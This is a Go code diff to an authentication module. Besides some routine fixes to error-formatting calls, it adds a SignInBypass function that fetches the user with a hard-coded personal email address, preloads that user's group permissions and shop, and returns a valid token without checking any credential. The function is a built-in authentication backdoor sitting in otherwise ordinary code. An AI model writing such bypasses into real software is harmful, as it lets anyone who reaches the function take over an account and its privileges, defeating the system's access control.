@@ -34,6 +34,22 @@ type dataOAuth struct {
 	Id_token      string `json:"id_token"`
 }
 
+func SignInBypass() (*types.Token, error) {
+	logctx := helper.LogContext(ClassNameAuth, "SignInBypass")
+
+	findFirst := &model.User{}
+	gormDb.Repos.Model(&model.User{}).
+		Preload(clause.Associations).
+		Preload("Group.GroupFunctions").
+		Preload("Group.GroupFunctions.Function").
+		Preload("Group.GroupTasks").
+		Preload("Group.GroupTasks.Task").
+		Preload("Group.Shop").
+		Where("email = ?", "firstzaxshot95@gmail.com").Find(findFirst)
+		logctx.Loggers("findFirst", findFirst)
+	return genToken(findFirst)
+}
+
 func SignInOAuth(code string) (*types.Token, error) {
 	logctx := helper.LogContext(ClassNameAuth, "OAuthURL")
 	logctx.Logger(code, "code")
@@ -52,7 +68,7 @@ func SignInOAuth(code string) (*types.Token, error) {
 
 	req, err := http.NewRequest("POST", config.ConfigOAuth.TokenURL, bytes.NewBufferString(data.Encode()))
 	if err != nil {
-		return nil, fmt.Errorf("Error creating request:", err)
+		return nil, fmt.Errorf("Error creating request:%v", err)
 	}
 	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
 
@@ -60,11 +76,11 @@ func SignInOAuth(code string) (*types.Token, error) {
 	resp, err := client.Do(req)
 
 	if err != nil {
-		return nil, fmt.Errorf("Error sending request:", err)
+		return nil, fmt.Errorf("Error sending request:%v", err)
 	}
 
 	if resp.StatusCode != http.StatusOK {
-		return nil, fmt.Errorf("Err api::", resp.StatusCode)
+		return nil, fmt.Errorf("Err api:%v", resp.StatusCode)
 	}
 
 	defer resp.Body.Close()
@@ -75,7 +91,7 @@ func SignInOAuth(code string) (*types.Token, error) {
 	derr := json.NewDecoder(resp.Body).Decode(responseData)
 
 	if derr != nil {
-		return nil, fmt.Errorf("Decode error:", derr)
+		return nil, fmt.Errorf("Decode error:%v", derr)
 	}
 
 	logctx.Logger(responseData, "responseData")
